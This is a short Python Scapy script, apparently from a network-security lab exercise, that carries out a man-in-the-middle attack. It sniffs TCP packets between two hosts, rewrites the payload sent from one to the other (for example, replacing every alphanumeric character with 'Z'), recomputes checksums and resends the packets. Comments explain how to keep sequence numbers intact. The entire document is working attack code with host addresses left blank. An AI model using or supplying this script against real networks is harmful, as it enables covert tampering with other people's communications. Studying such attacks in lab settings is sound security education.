#!/usr/bin/env python3
from scapy.all import * 
GREEN, RESET, BLOCK = ("\x1B[32m","\x1B[0m","▄")


IP_A, MAC_A = "", ""     
IP_B, MAC_B = "", ""     
IP_M, MAC_M = "", ""                   

print(GREEN, BLOCK*2, "LAUNCHING MITM ATTACK", BLOCK*2, RESET, sep=""),

def spoof_pkt(pkt):
  if pkt[IP].src == IP_A and pkt[IP].dst == IP_B: 
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
                       
    if pkt[TCP].payload:
      data = pkt[TCP].payload.load
      print("*** %s, length: %d" % (data, len(data)))
      #MODIFICATIONS HERE
      newdata = re.sub(r'[0-9a-zA-Z]', r'Z', data.decode()) 
      #replace all alphanumeric with Z OR
      #you can modify the packet before sending it e.g newdata = data.replace(b'kelvin', b'AAAAA')
      #use identical length for replacement, so as not to mess up the sequence numbers
      send(newpkt/newdata)
    else: 
      send(newpkt)

  elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].chksum)
    #here you can modify the packet before sending it
    send(newpkt)

# Berkeley Packet Filter Syntax
filter_template = 'tcp and (ether src {A} or ether src {B})'    
f = filter_template.format(A=MAC_A, B=MAC_B)  
pkt = sniff(iface='interface-name', filter=f, prn=spoof_pkt)
